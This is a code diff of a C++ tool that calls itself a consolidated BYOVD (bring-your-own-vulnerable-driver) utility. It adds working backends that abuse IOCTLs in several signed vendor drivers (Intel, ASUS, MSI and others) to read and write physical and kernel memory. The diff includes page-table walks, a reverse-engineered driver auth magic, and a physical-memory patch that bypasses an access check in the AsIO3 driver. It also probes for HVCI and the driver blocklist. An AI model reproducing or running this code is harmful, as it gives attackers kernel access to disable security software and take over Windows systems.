@@ -1,14 +1,3 @@
-/*
- * cascade.cpp - Consolidated BYOVD tool
- *
- * Providers supported (--driver-type):
- *   biostool  - BiosToolCommonDriver.sys (IOCTLs: 0x22202C/0x222030/0x222034)
- *   ktapi     - ktapi.sys  (IOCTLs: 0x82007000 map / 0x82007100 unmap)
- *   pdfwkrnl  - PdFwKrnl.sys already loaded (legacy warp.cpp backend)
- *
- * Requires: administrator, SeLoadDriverPrivilege.
- */
-
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
 #endif
@@ -56,10 +45,7 @@ typedef NTSTATUS(NTAPI* NtUnloadDriver_t)(PUNICODE_STRING_W RegistryPath);
 static NtLoadDriver_t   g_NtLoadDriver   = nullptr;
 static NtUnloadDriver_t g_NtUnloadDriver = nullptr;
 
-// ---------------------------------------------------------------------------
-// Provider types
-// ---------------------------------------------------------------------------
-enum class ProviderType { BiosTool, Ktapi, PdfwKrnl };
+enum class ProviderType { BiosTool, Ktapi, PdfwKrnl, IocDrv, AsIO3, NTIOLib, RtsPpx, RwDrv };
 
 struct Config {
     ProviderType type         = ProviderType::BiosTool;
@@ -90,13 +76,12 @@ struct Config {
     int          recvPort     = 9999;
     DWORD        targetPid    = 0;
     BYTE         xorKey       = 0x55;
+    std::string  patchDrvPath;   // secondary driver for AsIO3 IRP_MJ_CREATE bypass
+    std::string  patchDrvType;   // iocdrv | biostool | ktapi
 };
 
 static bool g_verbose = false;
 
-// ---------------------------------------------------------------------------
-// EPROCESS offsets
-// ---------------------------------------------------------------------------
 struct KernelOffsets {
     ULONG64 UniqueProcessId    = 0;
     ULONG64 ActiveProcessLinks = 0;
@@ -156,9 +141,6 @@ static DWORD GetWindowsBuild() {
     return build;
 }
 
-// ---------------------------------------------------------------------------
-// Privilege helper
-// ---------------------------------------------------------------------------
 static bool EnablePrivilege(const char* privName) {
     HANDLE hToken;
     if (!OpenProcessToken(GetCurrentProcess(),
@@ -178,9 +160,6 @@ static bool EnablePrivilege(const char* privName) {
     return ok;
 }
 
-// ---------------------------------------------------------------------------
-// Security feature detection (VBS, HVCI, Credential Guard)
-// ---------------------------------------------------------------------------
 struct SecurityStatus {
     bool vbsEnabled          = false;
     bool hvciEnabled         = false;
@@ -193,12 +172,8 @@ struct SecurityStatus {
 static SecurityStatus CheckSecurityFeatures() {
     SecurityStatus s;
     
-    // Method 1: Query DeviceGuard via WMI-style registry
-    // HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity
     HKEY hk;
     DWORD val = 0, sz = sizeof(val);
-    
-    // VBS Running status
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
         "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
         if (RegQueryValueExA(hk, "VirtualizationBasedSecurityStatus", nullptr, nullptr,
@@ -207,8 +182,7 @@ static SecurityStatus CheckSecurityFeatures() {
         }
         RegCloseKey(hk);
     }
-    
-    // HVCI enabled
+
     val = 0; sz = sizeof(val);
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
         "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
@@ -218,8 +192,7 @@ static SecurityStatus CheckSecurityFeatures() {
         }
         RegCloseKey(hk);
     }
-    
-    // Credential Guard
+
     val = 0; sz = sizeof(val);
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
         "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\CredentialGuard",
@@ -229,8 +202,7 @@ static SecurityStatus CheckSecurityFeatures() {
         }
         RegCloseKey(hk);
     }
-    
-    // Alternative: check via Lsa registry (Credential Guard config)
+
     val = 0; sz = sizeof(val);
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
         "SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
@@ -239,8 +211,7 @@ static SecurityStatus CheckSecurityFeatures() {
         }
         RegCloseKey(hk);
     }
-    
-    // Secure Boot status
+
     val = 0; sz = sizeof(val);
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
         "SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
@@ -249,8 +220,7 @@ static SecurityStatus CheckSecurityFeatures() {
         }
         RegCloseKey(hk);
     }
-    
-    // Driver blocklist (WDAC / HVCI driver blocklist)
+
     val = 0; sz = sizeof(val);
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
         "SYSTEM\\CurrentControlSet\\Control\\CI\\Config", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
@@ -259,8 +229,7 @@ static SecurityStatus CheckSecurityFeatures() {
         }
         RegCloseKey(hk);
     }
-    
-    // Build warning string
+
     if (s.hvciEnabled) {
         s.warnings += "[!] HVCI active - kernel writes may BSOD or fail silently\n";
     }
@@ -293,10 +262,6 @@ static void PrintSecurityStatus(const SecurityStatus& s) {
     }
 }
 
-// ---------------------------------------------------------------------------
-// Driver management
-
-// ---------------------------------------------------------------------------
 static std::wstring g_svcName;
 static std::wstring g_regPath;
 static std::wstring g_dropPath;
@@ -356,25 +321,17 @@ static bool CopyDriverToTemp(const std::wstring& srcPath, std::wstring& outDest)
     return true;
 }
 
-// ---------------------------------------------------------------------------
-// SHA-256 driver hash verification (opsec: catch wrong driver before load)
-// ---------------------------------------------------------------------------
 #include <wincrypt.h>
 #pragma comment(lib, "crypt32.lib")
 
-// Known-good driver SHA-256 hashes (lowercase hex). Extend as new drivers
-// are validated. Empty allowlist means "warn only".
 struct KnownDriver {
     const char* hashHex;
     const char* label;
     ProviderType type;
 };
 static const KnownDriver kKnownDrivers[] = {
-    // BiosToolCommonDriver.sys - lab-validated build (fill in real hash)
     {"", "BiosToolCommonDriver (unknown build)", ProviderType::BiosTool},
-    // PdFwKrnl.sys - Trend Micro; CVE-referenced
     {"", "PdFwKrnl (Trend Micro)", ProviderType::PdfwKrnl},
-    // ktapi.sys - Insyde variant
     {"", "ktapi (Insyde)", ProviderType::Ktapi},
     {nullptr, nullptr, ProviderType::BiosTool}
 };
@@ -431,7 +388,6 @@ static bool VerifyDriverHash(const std::wstring& path, ProviderType expected,
         }
     }
     if (!anyPopulated) {
-        // Allowlist not yet populated; warn only
         printf("[*] Driver hash allowlist is empty; skipping validation\n");
         return true;
     }
@@ -492,9 +448,6 @@ static void DeleteServiceKey(const std::wstring& svcName) {
     RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
 }
 
-// ---------------------------------------------------------------------------
-// Kernel R/W - BiosToolCommonDriver backend
-// ---------------------------------------------------------------------------
 static HANDLE g_biostoolDev = INVALID_HANDLE_VALUE;
 
 #define BIOSTOOL_READ_PHYS  0x22202Cu
@@ -579,13 +532,99 @@ static bool BiosTool_KWrite(QWORD va, PVOID buf, SIZE_T size) {
     return true;
 }
 
-// ---------------------------------------------------------------------------
-// Kernel R/W - Ktapi backend
-// Device: \\.\ktapi   IOCTLs: 0x82007000 (map PA->VA)  0x82007100 (unmap)
-// VA->PA: CR3 page walk bootstrapped from physical scan of PML4 self-ref.
-// ---------------------------------------------------------------------------
+static HANDLE g_abiosDev = INVALID_HANDLE_VALUE;
+
+#define ABIOS_IOCTL_READ  0x80102040u
+#define ABIOS_IOCTL_WRITE 0x80102044u
+
+static bool ABios_PhysRead(HANDLE hDev, QWORD pa, SIZE_T size, PVOID buf) {
+    SIZE_T total = 16 + size;
+    std::vector<BYTE> vbuf(total, 0);
+    memcpy(vbuf.data() + 0, &pa,   8);
+    memcpy(vbuf.data() + 8, &size, 8);
+    DWORD got = 0;
+    if (!DeviceIoControl(hDev, ABIOS_IOCTL_READ,
+            vbuf.data(), (DWORD)total,
+            vbuf.data(), (DWORD)total,
+            &got, nullptr))
+        return false;
+    if (got < (DWORD)(16 + size)) return false;
+    memcpy(buf, vbuf.data() + 16, size);
+    return true;
+}
+
+static bool ABios_PhysWrite(HANDLE hDev, QWORD pa, SIZE_T size, const PVOID data) {
+    SIZE_T total = 16 + size;
+    std::vector<BYTE> vbuf(total, 0);
+    memcpy(vbuf.data() + 0,  &pa,   8);
+    memcpy(vbuf.data() + 8,  &size, 8);
+    memcpy(vbuf.data() + 16, data,  size);
+    DWORD got = 0;
+    return !!DeviceIoControl(hDev, ABIOS_IOCTL_WRITE,
+        vbuf.data(), (DWORD)total,
+        vbuf.data(), (DWORD)total,
+        &got, nullptr);
+}
+
+static bool ABios_Probe(HANDLE hDev) {
+    BYTE probe[8] = {};
+    if (!ABios_PhysRead(hDev, 0x1000ULL, sizeof(probe), probe)) return false;
+    for (auto b : probe) if (b) return true;
+    return false;
+}
+
+static QWORD ABios_FindAndPatchAsIO3(HANDLE hDev, bool dryRun) {
+    MEMORYSTATUSEX ms = { sizeof(ms) };
+    GlobalMemoryStatusEx(&ms);
+    QWORD ramTop = ms.ullTotalPhys;
+    if (ramTop > 0x200000000ULL) ramTop = 0x200000000ULL;
+    ramTop = (ramTop + 0xFFF) & ~(QWORD)0xFFF;
+
+    printf("[*] ABios physical scan: PA 0 to 0x%llX (%llu MB), page offset 0x701\n",
+           ramTop, ramTop >> 20);
+
+    static const BYTE sig[6] = {0x84, 0xC0, 0x75, 0x12, 0x8B, 0x43};
+
+    DWORD progress = 0;
+    for (QWORD pa = 0; pa < ramTop; pa += 0x1000) {
+        if (++progress % 0x4000 == 0)
+            printf("[*] ...scanning PA 0x%llX / 0x%llX\n", pa, ramTop);
+
+        BYTE chunk[8] = {};
+        if (!ABios_PhysRead(hDev, pa + 0x701ULL, 8, chunk)) continue;
+        if (memcmp(chunk, sig, 6) != 0) continue;
+        printf("[+] AsIO3 signature match at PA 0x%llX+0x701 (byte@0x703=0x%02X)\n",
+               pa, chunk[2]);
+
+        if (dryRun) return pa + 0x703ULL;
+
+        if (chunk[2] == 0xEB) {
+            printf("[+] Already patched (0xEB JMP)\n");
+            return pa + 0x703ULL;
+        }
+        if (chunk[2] != 0x75) {
+            printf("[!] Unexpected byte 0x%02X at offset 0x703, skipping\n", chunk[2]);
+            continue;
+        }
+
+        BYTE pb = 0xEB;
+        if (!ABios_PhysWrite(hDev, pa + 0x703ULL, 1, &pb)) {
+            printf("[-] Write failed at PA 0x%llX+0x703\n", pa);
+            continue;
+        }
+        BYTE verify = 0;
+        if (!ABios_PhysRead(hDev, pa + 0x703ULL, 1, &verify) || verify != 0xEB) {
+            printf("[-] Verify failed: 0x%02X\n", verify);
+            continue;
+        }
+        printf("[+] Patched: JNE→JMP at PA 0x%llX+0x703\n", pa);
+        return pa + 0x703ULL;
+    }
+    return 0;
+}
+
 static HANDLE g_ktapiDev = INVALID_HANDLE_VALUE;
-static QWORD  g_ktapiCr3 = 0;  // kernel CR3 found by PML4 scan
+static QWORD  g_ktapiCr3 = 0;
 
 #define KTAPI_IOCTL_MAP   0x82007000u
 #define KTAPI_IOCTL_UNMAP 0x82007100u
@@ -607,10 +646,8 @@ static void Ktapi_UnmapPhys(PVOID mapped) {
                     nullptr, 0, &got, nullptr);
 }
 
-// Scan first 4GB of physical RAM for a page that self-maps at PML4[0x1ED].
-// A self-referencing PML4 entry satisfies: (entry & ~0xFFF) == PA_of_this_page.
 static QWORD Ktapi_FindCr3() {
-    for (QWORD pa = 0; pa < 0x100000000ULL; pa += 0x1000) {
+    for (QWORD pa = 0; pa < 0x800000000ULL; pa += 0x1000) {
         PVOID m = Ktapi_MapPhys((PVOID)pa, 0x1000);
         if (!m) continue;
         QWORD entry = *(QWORD*)((PUCHAR)m + 0x1ED * 8);
@@ -717,6 +754,7 @@ static bool Ktapi_KWrite(QWORD va, PVOID buf, SIZE_T size) {
 // Kernel R/W - PdFwKrnl backend
 // ---------------------------------------------------------------------------
 static HANDLE g_pdfwDev = INVALID_HANDLE_VALUE;
+
 #define IOCTL_AMDPDFW_MEMCPY 0x80002014
 
 typedef struct { BYTE r[16]; PVOID Dst; PVOID Src; PVOID r2; DWORD Size; DWORD r3; } PDFW_REQ;
@@ -734,8 +772,830 @@ static bool PdfwKrnl_KWrite(QWORD addr, PVOID buf, DWORD size) {
 }
 
 // ---------------------------------------------------------------------------
-// Unified R/W dispatch
+// Kernel R/W - iOCdrv backend (Intel XTU driver, device \\.\iocbios2)
+// Actual IOCTL codes from driver disassembly (iocbios2.sys, DeviceType=0x89FF, Access=3):
+//   0x89ffe430: phys DWORD read  — IN: {PA:u64, Size:u32=12 bytes}  OUT: u32 (4 bytes)
+//   0x89ffe434: phys DWORD write — IN: {PA:u64, Data:u64, Mask:u64=24 bytes}
 // ---------------------------------------------------------------------------
+static HANDLE g_iocDev  = INVALID_HANDLE_VALUE;
+static QWORD  g_iocCr3  = 0;
+
+#define IOCDRV_IOCTL_READ  0x89ffe430u
+#define IOCDRV_IOCTL_WRITE 0x89ffe434u
+
+#pragma pack(push,1)
+struct IocReadReq  { QWORD PhysAddr; DWORD Size; };
+struct IocWriteReq { QWORD PhysAddr; QWORD Data; QWORD Mask; };
+#pragma pack(pop)
+
+static bool IocDrv_PhysRead(QWORD pa, PVOID buf, DWORD size) {
+    if (size == 0) return true;
+    DWORD done = 0;
+    while (done < size) {
+        DWORD chunk = std::min(size - done, (DWORD)4);
+        IocReadReq req{ pa + done, 4 };
+        DWORD got = 0;
+        BYTE outBuf[12] = {0};  // driver requires OutputBufferLength >= 12
+        BOOL ok = DeviceIoControl(g_iocDev, IOCDRV_IOCTL_READ,
+            &req, sizeof(req),
+            outBuf, sizeof(outBuf), &got, nullptr);
+        if (!ok) return false;
+        memcpy((PBYTE)buf + done, outBuf, chunk);
+        done += chunk;
+    }
+    return true;
+}
+
+static bool IocDrv_PhysWrite(QWORD pa, PVOID data, DWORD size) {
+    if (size == 0) return true;
+    DWORD done = 0;
+    while (done < size) {
+        DWORD chunk = std::min(size - done, (DWORD)4);
+        DWORD val = 0;
+        memcpy(&val, (PBYTE)data + done, chunk);
+        IocWriteReq req{ pa + done, (QWORD)val, 0xFFFFFFFFULL };
+        DWORD got = 0;
+        BYTE outBuf[12] = {0};  // driver may require OutputBufferLength >= 12
+        BOOL ok = DeviceIoControl(g_iocDev, IOCDRV_IOCTL_WRITE,
+            &req, sizeof(req), outBuf, sizeof(outBuf), &got, nullptr);
+        if (!ok) return false;
+        done += chunk;
+    }
+    return true;
+}
+
+static QWORD IocDrv_FindCr3() {
+    for (QWORD pa = 0; pa < 0x800000000ULL; pa += 0x1000) {
+        for (int i = 0; i < 512; i++) {
+            QWORD entry = 0;
+            if (!IocDrv_PhysRead(pa + (QWORD)i * 8, &entry, 8)) break;
+            if ((entry & 1) && (entry & ~0xFFFULL) == pa)
+                return pa;
+        }
+    }
+    return 0;
+}
+
+static QWORD IocDrv_Va2Pa(QWORD va) {
+    if (!g_iocCr3) return 0;
+    QWORD pml4_idx = (va >> 39) & 0x1FF;
+    QWORD pdpt_idx = (va >> 30) & 0x1FF;
+    QWORD pd_idx   = (va >> 21) & 0x1FF;
+    QWORD pt_idx   = (va >> 12) & 0x1FF;
+    QWORD offset   = va & 0xFFF;
+
+    QWORD pml4e = 0; IocDrv_PhysRead((g_iocCr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8);
+    if (!(pml4e & 1)) return 0;
+    QWORD pdpte = 0; IocDrv_PhysRead((pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8);
+    if (!(pdpte & 1)) return 0;
+    if (pdpte & (1ULL << 7)) return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL);
+    QWORD pde = 0; IocDrv_PhysRead((pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8);
+    if (!(pde & 1)) return 0;
+    if (pde & (1ULL << 7)) return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL);
+    QWORD pte = 0; IocDrv_PhysRead((pde & ~0xFFFULL) + pt_idx * 8, &pte, 8);
+    if (!(pte & 1)) return 0;
+    return (pte & ~0xFFFULL) | offset;
+}
+
+static bool IocDrv_KRead(QWORD va, PVOID buf, SIZE_T size) {
+    auto pCurVA  = va;
+    auto pCurBuf = (PUCHAR)buf;
+    while (size > 0) {
+        ULONG_PTR off   = pCurVA & 0xFFF;
+        DWORD     chunk = (DWORD)std::min(size, (SIZE_T)(0x1000 - off));
+        QWORD pa = IocDrv_Va2Pa(pCurVA);
+        if (!pa) return false;
+        if (!IocDrv_PhysRead(pa, pCurBuf, chunk)) return false;
+        pCurVA  += chunk;
+        pCurBuf += chunk;
+        size    -= chunk;
+    }
+    return true;
+}
+
+static bool IocDrv_KWrite(QWORD va, PVOID buf, SIZE_T size) {
+    auto pCurVA  = va;
+    auto pCurBuf = (PUCHAR)buf;
+    while (size > 0) {
+        ULONG_PTR off   = pCurVA & 0xFFF;
+        DWORD     chunk = (DWORD)std::min(size, (SIZE_T)(0x1000 - off));
+        QWORD pa = IocDrv_Va2Pa(pCurVA);
+        if (!pa) return false;
+        if (!IocDrv_PhysWrite(pa, pCurBuf, chunk)) return false;
+        pCurVA  += chunk;
+        pCurBuf += chunk;
+        size    -= chunk;
+    }
+    return true;
+}
+
+#define ASMIO_IOCTL_READ  0x80002000u
+#define ASMIO_IOCTL_WRITE 0x80002004u
+
+#pragma pack(push,1)
+struct AsmIoReadReq  { UINT64 physAddr; DWORD size; DWORD flags; };
+struct AsmIoWriteReq { DWORD  physAddr; DWORD size; DWORD value; };
+#pragma pack(pop)
+
+static bool AsmIo_PhysRead(HANDLE dev, QWORD pa, PVOID buf, DWORD size) {
+    if (size == 0) return true;
+    DWORD done = 0;
+    while (done < size) {
+        DWORD chunk = std::min(size - done, (DWORD)8);
+        AsmIoReadReq req{ pa + done, chunk, 1 };
+        BYTE outBuf[8]{};
+        DWORD got = 0;
+        BOOL ok = DeviceIoControl(dev, ASMIO_IOCTL_READ,
+            &req, (DWORD)sizeof(req), outBuf, sizeof(outBuf), &got, nullptr);
+        if (!ok) return false;
+        DWORD take = std::min(chunk, (DWORD)sizeof(outBuf));
+        memcpy((PBYTE)buf + done, outBuf, take);
+        done += chunk;
+    }
+    return true;
+}
+
+static bool AsmIo_PhysWrite1(HANDLE dev, QWORD pa, BYTE val) {
+    if (pa >= 0x100000000ULL) {
+        printf("[-] AsmIo_PhysWrite1: PA 0x%llX >= 4GB, not supported\n", pa);
+        return false;
+    }
+    AsmIoWriteReq req{ (DWORD)pa, 1, val };
+    DWORD got = 0, outVal = 0;
+    return DeviceIoControl(dev, ASMIO_IOCTL_WRITE,
+        &req, sizeof(req), &outVal, sizeof(outVal), &got, nullptr) != FALSE;
+}
+
+static QWORD AsmIo_FindCr3(HANDLE dev) {
+    const QWORD RAM_LIMIT = 0x200000000ULL;
+
+    auto scan_range = [&](QWORD start, QWORD end) -> QWORD {
+        for (QWORD pa = start; pa < end; pa += 0x1000) {
+            QWORD e0 = 0;
+            if (!AsmIo_PhysRead(dev, pa, &e0, 8)) continue;
+            if (!(e0 & 1) || (e0 & 0x80)) continue;
+            QWORD pa0 = e0 & ~0xFFFULL;
+            if (pa0 == 0 || pa0 >= RAM_LIMIT) continue;
+            for (int i = 1; i < 512; i++) {
+                QWORD entry = 0;
+                if (!AsmIo_PhysRead(dev, pa + (QWORD)i * 8, &entry, 8)) break;
+                if ((entry & 1) && (entry & ~0xFFFULL) == pa)
+                    return pa;
+            }
+        }
+        return 0;
+    };
+
+    QWORD cr3 = scan_range(0x1000, 0x4000000ULL);
+    if (!cr3) cr3 = scan_range(0x4000000ULL, 0x10000000ULL);
+    return cr3;
+}
+
+static QWORD AsmIo_Va2Pa(HANDLE dev, QWORD cr3, QWORD va) {
+    QWORD pml4_idx = (va >> 39) & 0x1FF;
+    QWORD pdpt_idx = (va >> 30) & 0x1FF;
+    QWORD pd_idx   = (va >> 21) & 0x1FF;
+    QWORD pt_idx   = (va >> 12) & 0x1FF;
+    QWORD offset   = va & 0xFFF;
+
+    QWORD pml4e = 0; AsmIo_PhysRead(dev, (cr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8);
+    if (!(pml4e & 1)) return 0;
+    QWORD pdpte = 0; AsmIo_PhysRead(dev, (pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8);
+    if (!(pdpte & 1)) return 0;
+    if (pdpte & (1ULL << 7)) return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL);
+    QWORD pde = 0; AsmIo_PhysRead(dev, (pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8);
+    if (!(pde & 1)) return 0;
+    if (pde & (1ULL << 7)) return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL);
+    QWORD pte = 0; AsmIo_PhysRead(dev, (pde & ~0xFFFULL) + pt_idx * 8, &pte, 8);
+    if (!(pte & 1)) return 0;
+    return (pte & ~0xFFFULL) | offset;
+}
+
+static QWORD FindAsIO3BaseBySignatureAsmIo(HANDLE dev, QWORD cr3) {
+    LPVOID drvs[1024]; DWORD cb = 0;
+    if (!EnumDeviceDrivers(drvs, sizeof(drvs), &cb)) return 0;
+    int n = cb / sizeof(LPVOID);
+    for (int i = 0; i < n; i++) {
+        QWORD base = (QWORD)drvs[i];
+        if (!base || base < 0xFFFF000000000000ULL) continue;
+        QWORD va = base + 0x2701;
+        QWORD pa = AsmIo_Va2Pa(dev, cr3, va);
+        if (!pa) continue;
+        BYTE sig[6]{};
+        if (!AsmIo_PhysRead(dev, pa, sig, 6)) continue;
+        if (sig[0]==0x84 && sig[1]==0xC0 && sig[2]==0x75 &&
+            sig[3]==0x12 && sig[4]==0x8B && sig[5]==0x43) {
+            char nm[MAX_PATH]{};
+            GetDeviceDriverBaseNameA(drvs[i], nm, sizeof(nm));
+            printf("[+] AsIO3 found by signature at 0x%llX (%s)\n", base, nm);
+            return base;
+        }
+    }
+    return 0;
+}
+
+#define ASIO3_IOCTL_PHYS_READ  0xa0400f84u
+#define ASIO3_IOCTL_PHYS_WRITE 0xa0400f80u
+#define ASIO3_BUF_SIZE         0x1028u
+#define ASIO3_READ_DATA_OFF    0x28u
+
+static HANDLE g_asio3Dev    = INVALID_HANDLE_VALUE;
+static QWORD  g_asio3Cr3    = 0;
+static HANDLE g_swwlEvent   = nullptr;
+
+static void Asio3_CreateSwwlEvent() {
+    g_swwlEvent = CreateEventW(nullptr, FALSE, FALSE, L"Global\\WaitForIoAccess");
+    if (!g_swwlEvent)
+        printf("[!] CreateEventW(WaitForIoAccess) failed: %lu (driver will create its own)\n",
+               GetLastError());
+    else
+        printf("[+] SWWL event created (Global\\WaitForIoAccess)\n");
+}
+
+static bool Asio3_PhysRead(QWORD pa, PVOID buf, DWORD size) {
+    DWORD done = 0;
+    while (done < size) {
+        QWORD pageBase = (pa + done) & ~(QWORD)0xFFF;
+        DWORD pageOff  = (DWORD)((pa + done) & 0xFFF);
+        DWORD avail    = 0x1000u - pageOff;
+        DWORD chunk    = std::min(size - done, avail);
+        BYTE  iobuf[ASIO3_BUF_SIZE] = {};
+        *(DWORD*)(iobuf + 0) = 0x4c575753;  // SWWL magic
+        *(QWORD*)(iobuf + 0x18) = pageBase;
+        DWORD got = 0;
+        if (!DeviceIoControl(g_asio3Dev, ASIO3_IOCTL_PHYS_READ,
+                iobuf, ASIO3_BUF_SIZE, iobuf, ASIO3_BUF_SIZE, &got, nullptr))
+            return false;
+        memcpy((PBYTE)buf + done, iobuf + ASIO3_READ_DATA_OFF + pageOff, chunk);
+        done += chunk;
+    }
+    return true;
+}
+
+static bool Asio3_PhysWrite(QWORD pa, PVOID data, DWORD size) {
+    DWORD done = 0;
+    while (done < size) {
+        DWORD rem = size - done;
+        BYTE  iobuf[ASIO3_BUF_SIZE] = {};
+        DWORD chunk;
+        if (rem >= 4) {
+            iobuf[0] = 4;
+            memcpy(iobuf + 4, (PBYTE)data + done, 4);
+            chunk = 4;
+        } else if (rem >= 2) {
+            iobuf[0] = 2;
+            memcpy(iobuf + 2, (PBYTE)data + done, 2);
+            chunk = 2;
+        } else {
+            iobuf[0] = 1;
+            iobuf[1] = *((PBYTE)data + done);
+            chunk = 1;
+        }
+        *(DWORD*)(iobuf + 0x10) = 0x1000;
+        *(QWORD*)(iobuf + 0x18) = pa + done;
+        DWORD got = 0;
+        if (!DeviceIoControl(g_asio3Dev, ASIO3_IOCTL_PHYS_WRITE,
+                iobuf, ASIO3_BUF_SIZE, iobuf, ASIO3_BUF_SIZE, &got, nullptr))
+            return false;
+        done += chunk;
+    }
+    return true;
+}
+
+static QWORD Asio3_FindCr3() {
+    // Scan physical pages for a PML4 with a self-referencing entry.
+    // Reads one full 4KB page per IOCTL — much more efficient than per-QWORD reads.
+    for (QWORD pa = 0; pa < 0x800000000ULL; pa += 0x1000) {
+        QWORD entries[512];
+        if (!Asio3_PhysRead(pa, entries, sizeof(entries))) continue;
+        for (int i = 0; i < 512; i++) {
+            if ((entries[i] & 1) && (entries[i] & ~(QWORD)0xFFF) == pa)
+                return pa;
+        }
+    }
+    return 0;
+}
+
+static QWORD Asio3_Va2Pa(QWORD va) {
+    if (!g_asio3Cr3) return 0;
+    QWORD cr3      = g_asio3Cr3 & ~(QWORD)0xFFF;
+    QWORD pml4_idx = (va >> 39) & 0x1FF;
+    QWORD pdpt_idx = (va >> 30) & 0x1FF;
+    QWORD pd_idx   = (va >> 21) & 0x1FF;
+    QWORD pt_idx   = (va >> 12) & 0x1FF;
+    QWORD offset   = va & 0xFFF;
+
+    QWORD pml4e = 0; Asio3_PhysRead(cr3 + pml4_idx * 8, &pml4e, 8);
+    if (!(pml4e & 1)) return 0;
+    QWORD pdpte = 0; Asio3_PhysRead((pml4e & ~(QWORD)0xFFF) + pdpt_idx * 8, &pdpte, 8);
+    if (!(pdpte & 1)) return 0;
+    if (pdpte & (1ULL << 7)) return (pdpte & ~(QWORD)0x3FFFFFFF) | (va & 0x3FFFFFFF);
+    QWORD pde = 0; Asio3_PhysRead((pdpte & ~(QWORD)0xFFF) + pd_idx * 8, &pde, 8);
+    if (!(pde & 1)) return 0;
+    if (pde & (1ULL << 7)) return (pde & ~(QWORD)0x1FFFFF) | (va & 0x1FFFFF);
+    QWORD pte = 0; Asio3_PhysRead((pde & ~(QWORD)0xFFF) + pt_idx * 8, &pte, 8);
+    if (!(pte & 1)) return 0;
+    return (pte & ~(QWORD)0xFFF) | offset;
+}
+
+static bool Asio3_KRead(QWORD va, PVOID buf, SIZE_T size) {
+    auto pCurVA  = va;
+    auto pCurBuf = (PUCHAR)buf;
+    while (size > 0) {
+        DWORD off   = (DWORD)(pCurVA & 0xFFF);
+        DWORD chunk = (DWORD)std::min(size, (SIZE_T)(0x1000 - off));
+        QWORD pa    = Asio3_Va2Pa(pCurVA);
+        if (!pa) return false;
+        if (!Asio3_PhysRead(pa, pCurBuf, chunk)) return false;
+        pCurVA  += chunk;
+        pCurBuf += chunk;
+        size    -= chunk;
+    }
+    return true;
+}
+
+static bool Asio3_KWrite(QWORD va, PVOID buf, SIZE_T size) {
+    auto pCurVA  = va;
+    auto pCurBuf = (PUCHAR)buf;
+    while (size > 0) {
+        DWORD off   = (DWORD)(pCurVA & 0xFFF);
+        DWORD chunk = (DWORD)std::min(size, (SIZE_T)(0x1000 - off));
+        QWORD pa    = Asio3_Va2Pa(pCurVA);
+        if (!pa) return false;
+        if (!Asio3_PhysWrite(pa, pCurBuf, chunk)) return false;
+        pCurVA  += chunk;
+        pCurBuf += chunk;
+        size    -= chunk;
+    }
+    return true;
+}
+
+// ---------------------------------------------------------------------------
+// Kernel R/W - NTIOLib backend (MSI MysticLight driver, device \\.\NTIOLib_MysticLight)
+// Reverse engineered IOCTLs:
+//   0xc350214c: Auth - input=0x2f405a34 (4 bytes) enables other IOCTLs
+//   0xc350a108: PhysRead - input: {PA:u64, ElemSize:u32, Count:u32}, output: data
+//   0xc350a148: PhysWrite - similar structure
+// ---------------------------------------------------------------------------
+static HANDLE g_ntiolibDev = INVALID_HANDLE_VALUE;
+static QWORD  g_ntiolibCr3 = 0;
+
+#define NTIOLIB_IOCTL_AUTH       0xc350214cu
+#define NTIOLIB_IOCTL_PHYS_READ  0xc350a108u
+#define NTIOLIB_IOCTL_PHYS_WRITE 0xc350a148u
+#define NTIOLIB_AUTH_MAGIC       0x2f405a34u
+
+#pragma pack(push,1)
+struct NtiolibReq { QWORD PhysAddr; DWORD ElemSize; DWORD Count; };
+#pragma pack(pop)
+
+static bool NTIOLib_Auth() {
+    DWORD magic = NTIOLIB_AUTH_MAGIC;
+    DWORD got = 0;
+    return DeviceIoControl(g_ntiolibDev, NTIOLIB_IOCTL_AUTH,
+        &magic, sizeof(magic), nullptr, 0, &got, nullptr) != FALSE;
+}
+
+static bool NTIOLib_PhysRead(QWORD pa, PVOID buf, DWORD size) {
+    if (size == 0) return true;
+    DWORD done = 0;
+    while (done < size) {
+        DWORD chunk = std::min(size - done, (DWORD)4);
+        DWORD elemSize = (chunk >= 4) ? 4 : (chunk >= 2) ? 2 : 1;
+        NtiolibReq req{ pa + done, elemSize, 1 };
+        BYTE outBuf[32] = {0};
+        DWORD got = 0;
+        BOOL ok = DeviceIoControl(g_ntiolibDev, NTIOLIB_IOCTL_PHYS_READ,
+            &req, sizeof(req), outBuf, sizeof(outBuf), &got, nullptr);
+        if (!ok) return false;
+        memcpy((PBYTE)buf + done, outBuf, elemSize);
+        done += elemSize;
+    }
+    return true;
+}
+
+static bool NTIOLib_PhysWrite(QWORD pa, PVOID buf, DWORD size) {
+    if (size == 0) return true;
+    DWORD done = 0;
+    while (done < size) {
+        DWORD chunk = std::min(size - done, (DWORD)4);
